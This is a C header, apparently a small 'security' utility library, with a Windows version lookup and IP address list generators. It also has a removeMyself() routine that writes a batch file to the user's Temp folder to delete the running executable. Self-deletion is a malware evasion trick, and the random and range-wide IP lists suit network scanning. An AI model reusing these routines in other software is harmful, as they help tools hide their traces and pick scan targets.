#ifndef __SN_SECURITY__
#define __SN_SECURITY__
#include <wchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <time.h>
#include <math.h>

#include "snRand.h"

#define SiLanSize 256
#define OSVERSIONINFOSize sizeof(OSVERSIONINFO)

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>

typedef struct {
    sn_u32 MainNumber;
    sn_u32 SubNumber;
    sn_u32 BuildNumber;
    snChar version[10];
} sysVer;

static sysVer *snGetOSVersion()
{
    OSVERSIONINFO *osPtr;
    sysVer *info;
    
    osPtr = (OSVERSIONINFO *)malloc(OSVERSIONINFOSize);
    info = (sysVer *)malloc(sizeof(sysVer));

    osPtr->dwOSVersionInfoSize = OSVERSIONINFOSize;
    GetVersionEx(osPtr);

    info->MainNumber = osPtr->dwMajorVersion;
    info->SubNumber = osPtr->dwMinorVersion;
    info->BuildNumber = osPtr->dwBuildNumber;

    memset(info->version, 0, 10);

    if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 22621) {
        memcpy(info->version, "11_22H2", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 22000) {
        memcpy(info->version, "11_21H2", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 19044) {
        memcpy(info->version, "10_21H2", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 19043) {
        memcpy(info->version, "10_21H1", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 19042) {
        memcpy(info->version, "10_20H2", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 19041) {
        memcpy(info->version, "10_2004", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 18363) {
        memcpy(info->version, "10_1909", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 18362) {
        memcpy(info->version, "10_1903", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 17763) {
        memcpy(info->version, "10_1809", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 17134) {
        memcpy(info->version, "10_1803", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 16299) {
        memcpy(info->version, "10_1709", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 15063) {
        memcpy(info->version, "10_1703", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 14393) {
        memcpy(info->version, "10_1607", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 10586) {
        memcpy(info->version, "10_1511", 7);
    } else if(info->MainNumber == 10 && info->SubNumber == 0 && info->BuildNumber == 10240) {
        memcpy(info->version, "10", 2);
    } else if(info->MainNumber == 6 && info->SubNumber == 3 && info->BuildNumber == 9600) {
        memcpy(info->version, "8.1", 3);
    } else if(info->MainNumber == 6 && info->SubNumber == 3 && info->BuildNumber == 9200) {
        memcpy(info->version, "8.1", 3);
    } else if(info->MainNumber == 6 && info->SubNumber == 2 && info->BuildNumber == 9200) {
        memcpy(info->version, "8", 1);
    } else if(info->MainNumber == 6 && info->SubNumber == 1 && info->BuildNumber == 7601) {
        memcpy(info->version, "7_SP1", 5);
    } else if(info->MainNumber == 6 && info->SubNumber == 1 && info->BuildNumber == 7600) {
        memcpy(info->version, "7", 1);
    } else if(info->MainNumber == 6 && info->SubNumber == 0 && info->BuildNumber == 6002) {
        memcpy(info->version, "Vista_SP2", 9);
    } else if(info->MainNumber == 6 && info->SubNumber == 0 && info->BuildNumber == 6001) {
        memcpy(info->version, "Vista_SP1", 9);
    } else if(info->MainNumber == 6 && info->SubNumber == 0 && info->BuildNumber == 6000) {
        memcpy(info->version, "Vista", 5);
    } else if(info->MainNumber == 5 && info->SubNumber == 1 && info->BuildNumber == 2600) {
        memcpy(info->version, "XP", 2);
    } else {
        memcpy(info->version, "unknown", 7);
    }

    return info;
}

static void removeMyself()
{
    TCHAR userName[SiLanSize];
    DWORD userSize = SiLanSize;

    char filePath[SiLanSize];
    char shellCommand[SiLanSize];

    GetUserName(userName, &userSize);

    sprintf(filePath, "C:\\Users\\%s\\AppData\\Local\\Temp\\123123123.bat", userName);
    FILE *fp = fopen(filePath, "wb");
    fprintf(fp,
        "@echo off\n"
        "ping 127.0.0.1 -n 2 > nul\n"
        "del /q /s %s\n"
        "exit",
        __argv[0]);
    fclose(fp);

    sprintf(shellCommand, "cmd /c start %s", filePath);

    system(shellCommand);
}
#endif

static int createIPAddress(const snChar *__format, const snChar *fn)
{
    FILE *fp = fopen(fn, "wb");
    short i3, i4;

    if(!fp)
        return EOF;

    for(i3 = 0; i3 < 256; ++i3) {
        for(i4 = 0; i4 < 256; ++i4) {
            fprintf(fp, __format, i3, i4);
        }
    }

    fclose(fp);
    return 0;
}

static char **createRandomIPAddress(int count)
{
    char **_buff = (char **)malloc(sizeof(char *) * count);

    snSetRandomTimerSeed();
    for(int x = 0; x < count; ++x) {
        _buff[x] = (char *)malloc(16);
        memset(_buff[x], 0, 16);
        sprintf(
            _buff[x], "%d.%d.%d.%d",
            (int)randint(0, 255),
            (int)randint(0, 255),
            (int)randint(0, 255),
            (int)randint(0, 255)
        );
    }

    return _buff;
}
#endif